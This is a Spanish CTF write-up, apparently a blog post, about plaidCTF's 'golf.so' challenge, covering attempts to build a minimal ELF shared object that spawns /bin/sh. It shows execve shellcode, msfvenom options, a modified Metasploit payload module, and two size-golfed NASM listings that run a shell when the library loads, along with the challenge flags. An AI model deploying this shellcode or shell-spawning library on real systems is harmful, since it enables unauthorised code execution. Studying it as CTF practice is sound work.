---
layout: post
title: golf.so - plaidCTF
author: devploit
item_image: https://www.primalsecurity.net/wp-content/uploads/2014/08/Header.png
tags: ctf plaidCTF shellcoding assembly
---

## 0x01 Challenge:

**Level:** Medium/Hard

**Descripción:**

>**golf.so**
>
>Thinking that Bovik’s flags might be hidden in plain sight, you find on your minimap of the Inner Sanctum that there’s a golf course tucked into the northeast corner. Before other people catch on to the idea, you sneak off towards the rolling grassy hills of the golf course.
>As you walk up to the entrance, a small man with pointy ears pops up out of the ground.
>“Would you like to play? Right now almost nobody is here, so it’ll only be a thousand checkers to play a round.“
>You wave your hand and send the man the required amount. It’s not a lot of money, but your balance dwindles to a paltry sum.
>“Thanks! Enjoy your game.“
>A golf club appears in your hand along with a ball that looks suspiciously too large. The start of the first hole beckons, and you stride over to tee off.
>http://golf.so.pwni.ng

### 0x02 Write-up:

A diferencia de casi todos los jugadores de CTF, soy muy fan de los retos "fuera de lo común" que no solo implican hackear una web / explotar una vulnerabilidad / etc. Sino que además te hacen pensar y jugar con cada paso que das. Este write-up va de un reto (al que le tengo amor-odio) que hemos resuelto este fin de semana mis compañeros de equipo y yo en el plaidCTF. Voy a explicar no únicamente la resolución, sino todos los intentos llevados a cabo durante el proceso que me hizo estar la noche del viernes sin dormir.

<img width="600" height="300" src="https://i.imgur.com/yzqjlTl.png">

La finalidad del reto (a priori) es pasarle a la web proporcionada un archivo ELF Shared Object con un peso máximo de 1024 bytes y que debe ejecutar una shell con la siguiente sintaxis: ```execve("/bin/sh", ["/bin/sh"], ...)```. Digo a priori porque los creadores son muy trolls y nos tienen preparadas varias sorpresas.

### 0x02-1 Intento de shellcoding básico:

En primer lugar intentamos crear una shellcode a partir de un asm básico como es este que vemos aquí.
```asm
section .text
    global _start
_start:
    xor rdx, rdx
    push rdx
    mov rax, 0x68732f2f6e69622f
    push rax
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    xor rax, rax
    mov al, 0x3b
    syscall
```

El archivo que solo pesa 221 bytes (buen tamaño para lo que nos pide) aumenta de tamaño considerablemente (hasta más de 4 veces el máximo permitido por el reto) al convertirlo a un ELF-so tal y como vemos en la imagen.

<img width="500" height="150" src="https://i.imgur.com/A4kfBER.png">

Por lo que está claro que no va a colar hacerlo de la manera habitual... Es algo que nos intuiamos teniendo en cuenta el nivel de los retos de este CTF.

### 0x02-2 Intento de shellcoding usando Msfvenom:

Si, a priori puede ser una idea estúpida pero Msfvenom tiene algunos parámetros que son para pararse a ver de cerca.

Si nos fijamos en las flags de ejecución del programa, podemos ver que tiene una especifica para crear las shellcodes con el menor tamaño posible.

<img width="800" height="350" src="https://i.imgur.com/J1YXOR3.png">

Vamos a probar a crear una con ese parámetro para ver el tamaño que utiliza:
```
-p linux/x64/exec       # payload a ejecutar
CMD="/bin/sh"           # comando que queremos ejecutar
--arch x64              # arquitectura que nos pide el reto
--platform linux        # SO del sistema que lo ejecutará
-f elf-so               # formato ELF Shared Object
--smallest              # con el menor tamaño posible
-o trythis              # nombre que le ponemos a la shellcode
```

<img width="800" height="100" src="https://i.imgur.com/LaJ6flJ.png">

¡Vemos como el tamaño es de 450 bytes! ¿Nos servirá para el reto? Probamos a subirlo y...

<img width="600" height="150" src="https://i.imgur.com/w7qvnWH.png">

Parece que al servidor no le gusta lo que le mandamos a pesar de cumplir con los requisitos de tamaño...

Si nos fijamos bien, nos dice que estamos intentando ejecutar ```execve("/bin/sh", ["/bin/sh", ...], ...)``` y necesitamos ejecutar ```execve("/bin/sh", ["/bin/sh"], ...)```. Parece que le estamos mandando un argumento de más... Y así es. Si revisamos el código de ensamblador del payload utilizado en Msfvenom, vemos que ejecuta lo siguiente:

```
execve("/bin/sh", ["/bin/sh", '-c' 'CMD'], 0)
```

Añade el argumento -c y el comando que deseamos ejecutar (comando obligatorio en la creación de este shellcode). ¿Descartamos Msfvenom? Desde luego compila con un tamaño mucho menor que ld... vamos a darle otra oportunidad.

Nos vamos a la ruta donde se encuentra el archivo ruby del payload que ejecuta para modificarlo ```/usr/share/metasploit-framework/modules/payloads/singles/linux/x64/exec.rb```

La modificación que hacemos es simple, como vemos en la siguiente imagen:

<img width="1000" height="700" src="https://i.imgur.com/rr1q1vg.png">

En primer lugar modificamos el argumento CMD para que no sea indispensable en la creación de la shellcode. En segundo lugar eliminamos las referencias a CMD y a "-c" en el código ensamblador para cumplir con los requisitos del reto (si lo vais a probar acordaos de hacer un backup de como se encontraba el archivo antes de los cambios).

Si probamos a ejecutar de nuevo Msfvenom con nuestro nuevo payload obviando los parámetros que ya no son necesarios...

<img width="800" height="100" src="https://i.imgur.com/Lqu7AnJ.png">

Funciona. Y si lo subimos a la web... ¡No da error! Pero tampoco la flag...

<img width="600" height="150" src="https://i.imgur.com/NbzulOC.png">

Parece que a los creadores no les vale con el tamaño conseguido y quieren que lo bajemos a 300 bytes... (un saludo al que montó el reto (:)

Tras intentar modificar el ELF durante horas borrando bytes innecesarios y parcheando luego para que no nos de un segfault, tiramos la toalla con este método.

### 0x02-3 Intento de shellcoding 'a manilla':

A raíz de que uno de mis compañeros descubriese esta web: [https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html](https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html) quedó clara cual debía ser la manera de generar el shellcode. En el post se explican diferentes técnicas/tips de programación en ensamblador que generan archivos binarios de menor tamaño. Un ejemplo de ello es lo siguiente:

```
Si queremos establecer eax con valor 1 solemos utilizar la siguiente instrucción:

mov eax, 1

Sin embargo, si hacemos un xor sobre si mismo y luego incrementamos el valor una vez, ahorramos 2 bytes (a pesar de que el código asm sea más extenso):

xor eax, eax
inc eax
```

Tras leer las diferentes técnicas explicadas, lo que debemos hacer es compilar nuestro código asm a un archivo ".bin" y hacer que este se pueda ejecutar como ELF-so. Para ello debe tener al menos la cabecera ELF y dos program headers. Por otro lado, necesitamos añadirle la sección DYNAMIC que contiene información sobre la librería, entrypoint, etc. Esta sección apunta a la estructura "elf64_dyn" que es donde se definen estos datos.

Una vez lo tenemos todo, toca reducir tamaño con lo aprendido hasta quedar por debajo de los 300 bytes (la única explicación que puedo daros es ensayo y error hasta morir...). Entre las técnicas que hemos utilizado para la creación, podemos ver:

*   Solapamiento de estructuras.
*   Reutilización de headers para cargar código.
*   Aprovechamiento de nullbytes.

El código con el que conseguimos bajar de los 300 bytes fue el siguiente:
```asm
BITS 64
            ; org     0x0400000
ehdr:                                               ; Elf64_Ehdr
            db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
            db      0,0,0,0,0,0,0,0

            dw      3                               ;   e_type  2: EXE   3:shared object
            dw      62                              ;   e_machine
            dd      1                               ;   e_version
            dq      _init_proc                      ;   e_entry
            dq      phdr - $$                       ;   e_phoff
            dq      0                               ;   e_shoff
            dd      0                               ;   e_flags
            dw      ehdrsize                        ;   e_ehsize
            dw      phdrsize                        ;   e_phentsize
            dw      2                               ;   e_phnum
            dw      0x40                            ;   e_shentsize
            dw      0                               ;   e_shnum
            dw      0                               ;   e_shstrndx

; Constante con el tamaño de la cabecera ELF.
ehdrsize    equ     $ - ehdr

; Program Headers.
phdr:                                               ; Elf64_Phdr
            dd      1                               ;   p_type           
            dd      7                               ;   p_flags
            dq      0                               ;   p_offset
            dq      0                               ;   p_vaddr
            dq      0                               ;   p_paddr
            dq      filesize                        ;   p_filesz
            dq      filesize                        ;   p_memsz
            dq      0x1000                          ;   p_align

phdrsize    equ     $ - phdr
            dd      2                               ;   p_type            
            dd      6                               ;   p_flags
            dq      elf64dyn                        ;   p_offset
            dq      elf64dyn                        ;   p_vaddr
            dq      elf64dyn                        ;   p_paddr
            dq      elf64dyn_end - elf64dyn         ;   p_filesz
            dq      elf64dyn_end - elf64dyn         ;   p_memsz
            dq      0x1000                          ;   p_align

; Payload
_init_proc:
    push 0x3b
    pop rax
    cdq
    mov rbx, 0x68732F6E69622F
    push rbx
    mov rdi, rsp
    push 0x632d
    mov rsi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    syscall

elf64dyn:
            dq 0x0c, _init_proc
            dq 0x05, null
            dq 0x06, null
null:
elf64dyn_end:    

; Tamaño total del binario
filesize      equ     $ - $$
```

Tras ello conseguimos la primera flag: `PCTF{th0ugh_wE_have_cl1mBed_far_we_MusT_St1ll_c0ntinue_oNward}`

<img width="600" height="150" src="https://i.imgur.com/77DdWl0.png">

Para hacernos con la segunda debemos seguir modificando el código hasta que nuestro binario pese menos de 194 bytes... Tras un rato, el código con el que se consiguió fue:

```asm
BITS 64
            ; org     0x0400000
ehdr:                                               ; Elf64_Ehdr
            db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
            db      0,0,0,0,0,0,0,0
            dw      3								; 	e_type
			dw		62                           	;   e_machine
            dd      1                               ;   e_version
            dq      _init_proc, overlapphdr         ;   e_entry, e_phoff

codepart1:
    push rbx
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp    
    syscall
    db 0
            dw      0x40							;	e_ehsize,
			dw		0x38							;	e_phentsize
			dw		2								;	e_phnum
			dw		0x40             				;	e_shentsize
			
overlapphdr:
            dw      1, 0                            ;   e_shnum, e_shstrndx

; Constante con el tamaño de la cabecera ELF.			
ehdrsize    equ     $ - ehdr

; Program Headers.
phdr:                                               ; Elf64_Phdr
            dd      7                               ;   p_flags
            dq      0								;	p_offset, 
			dq		0                            	;   p_vaddr

; Payload
_init_proc:
	push 0x3b
	pop rax
	cdq
	mov rbx, 0x68732F6E69622F
	jmp codepart1

            dq      filesize						;	p_memsz
			dq		0x1000                			;   p_align

phdrsize    equ     $ - phdr

            dd      2								;	p_type
			dd		6                           	;   p_flags
            dq      elf64dyn						;	p_offset
			dq		elf64dyn              			;	p_vaddr

elf64dyn:
            dq 		0x0c
			dq 		_init_proc
			dq 		0x05, 0
            db 		0x06  
null:       
elf64dyn_end:    

; Tamaño total del binario
filesize      equ     $ - $$
```

**CC: @julianjm como autor del código de esta shellcode final.**

El cual nos devuelve la segunda flag: `PCTF{t0_get_a_t1ny_elf_we_5tick_1ts_hand5_in_its_ears_rtmlpntyea}`

<img width="600" height="150" src="https://i.imgur.com/2btlIm3.png">

Esta última shellcode llegó a pesar tan solo 173 bytes, lo cual nos dió un puesto en el scoreboard final entre las shellcodes de menor tamaño.

<img width="500" height="800" src="https://i.imgur.com/0ssZWSq.png">

Echando un vistazo atrás, podemos comparar nuestro ELF-so final con el generado por Msfvenom:

ELF-so Msfvenom:

<img width="800" height="500" src="https://i.imgur.com/duQajCo.png">

ELF-so handmade:

<img width="800" height="200" src="https://i.imgur.com/cjr8E4f.png">

La diferencia de tamaño es abismal aunque cierto es que la facilidad de creación en comparación es igual de grande...

Por último, dar la enhorabuena a los creadores del CTF por un reto tan original.